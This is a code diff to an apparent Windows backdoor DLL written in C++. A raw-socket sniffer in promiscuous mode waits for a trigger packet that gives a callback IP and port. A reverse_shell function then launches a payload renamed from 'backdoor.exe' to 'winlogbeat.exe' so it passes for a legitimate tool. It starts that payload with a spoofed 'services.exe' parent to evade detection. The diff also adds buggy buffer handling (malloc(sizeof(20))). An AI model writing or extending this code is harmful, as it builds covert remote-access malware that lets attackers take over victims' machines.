@@ -5,9 +5,10 @@
 #include <WinSock2.h>
 #include <mstcpip.h>
 #include <WS2tcpip.h>
-#include <string>
 #include <time.h>
+#include <string>
 #include "Jade.h"
+
 
 #define EXPORT __declspec(dllexport)
 
@@ -73,7 +74,7 @@ void
 reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 {
 	srand(time(NULL));
-
+	
 	// Generate random hex chars for the beginning portion of the "GUID" prepend with '{'
 	char first[10];
 	first[0] = '{';
@@ -100,25 +101,26 @@ reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 	last[12] = '}';
 	last[13] = '\0';
 
-	// Convert to each var to string to easily combine
-	std::string str_first(first);
-	std::string str_iph(ip_high);
-	std::string str_ipl(ip_low);
-	std::string str_port(sport);
-	std::string str_last(last);
-	std::string program = "backdoor.exe ";
+	const size_t size = 256 + strlen(first) + strlen(ip_high) + strlen(ip_low) + strlen(sport) + strlen(last) + 5;
 
-	// Combine strings to form "GUID"
-	std::string cmdline = program + str_first + "-" + str_iph + "-" + str_ipl + "-" + str_port + "-" + str_last;
+	char *cmdbuff = new char[size];
 
-	int wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, NULL, 0);
-	wchar_t* commandline = new wchar_t[wchars_num];
-	MultiByteToWideChar(CP_UTF8, 0, cmdline.c_str(), -1, commandline, wchars_num);
+	strcpy(cmdbuff, "winlogbeat.exe ");
+	strcat(cmdbuff, first);
+	strcat(cmdbuff, "-");
+	strcat(cmdbuff, ip_high);
+	strcat(cmdbuff, "-");
+	strcat(cmdbuff, ip_low);
+	strcat(cmdbuff, "-");
+	strcat(cmdbuff, sport);
+	strcat(cmdbuff, "-");
+	strcat(cmdbuff, last);
 
 	const char parent[] = "services.exe";
 
-	SpoofParent(commandline, parent);
-	delete commandline;
+	SpoofParent(cmdbuff, parent);
+	delete cmdbuff;
+	
 }
 
 /* Starts the Raw Socket Listener that waits for the specified
@@ -150,13 +152,21 @@ start_listener(void)
 	if (sock == INVALID_SOCKET)
 		return -1;
 
+	char* localip = (char*)malloc(sizeof(20));
+	memset(localip, 0x0, sizeof(localip));
+	DWORD err = GetLocalIP(localip);
+	if (err != 0)
+		return -1;
+
 	sockaddr_in sniffer;
 	sniffer.sin_family = AF_INET;
 	sniffer.sin_port = htons(0);
-	sniffer.sin_addr.s_addr = inet_addr("0.0.0.0");
+	sniffer.sin_addr.s_addr = inet_addr(localip);
+	free(localip);
 
-	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR)
+	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR) 
 		return -1;
+	
 
 	// this function sets the interface to promiscuous mode
 	if (WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwLen, NULL, NULL) == SOCKET_ERROR)
@@ -197,7 +207,7 @@ start_listener(void)
 				
 				unsigned short port;
 				unsigned int   ip;
-				
+
 				//bit shifting to build the return port/IP
 				port = (cdata->port[0] << 8) + (cdata->port[1]);
 				ip = (cdata->addr[0] << 24);
